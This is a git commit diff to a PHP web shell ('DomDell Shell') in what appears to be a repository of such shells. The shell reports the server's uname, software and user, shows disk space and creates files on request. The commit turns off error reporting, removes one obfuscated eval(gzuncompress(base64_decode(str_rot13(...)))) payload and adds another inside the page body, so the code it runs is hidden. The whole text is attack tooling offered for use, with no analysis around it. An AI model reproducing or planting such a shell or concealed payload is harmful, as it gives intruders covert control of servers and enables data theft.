d9d0ac0aec2b082fa872dbb86ce580313d151387
Github User <84887432+1337r0j4n@users.noreply.github.com>
2024-06-30 15:53:33 +0630

    Add files via upload

--- SHELLs/DomDell Shell/domdell.php
+++ SHELLs/DomDell Shell/domdell.php
@@ -1,5 +1,6 @@
 <?php
 
+error_reporting(0);
 $free = disk_free_space("/") / 1073741824;
 $total = disk_total_space("/") / 1073741824;
 function RealIp()
@@ -42,7 +43,7 @@ if (isset($_POST['file'])) {
             $createFile = "We Can not Create File";
         }
     }
-}; eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
+};
 ?>
 
 <!DOCTYPE html>
@@ -318,7 +319,7 @@ if (isset($_POST['file'])) {
 </style>
 
 <body>
-    <?php  ?>
+    <?php eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj=')))); ?>
     <?php echo "<span style='color:white'> Uname : </span>"  .  "<span>" . php_uname() . "</span>"; ?><br />
     <?php echo "<span style='color:white'>Server : </span>" . "<span>"  . $_SERVER['SERVER_SOFTWARE']  . "</span>" ?><br />
     <?php echo "<span style='color:white'>Whoami : </span>" . "<span>"  . get_current_user()  . "</span>" ?><br />
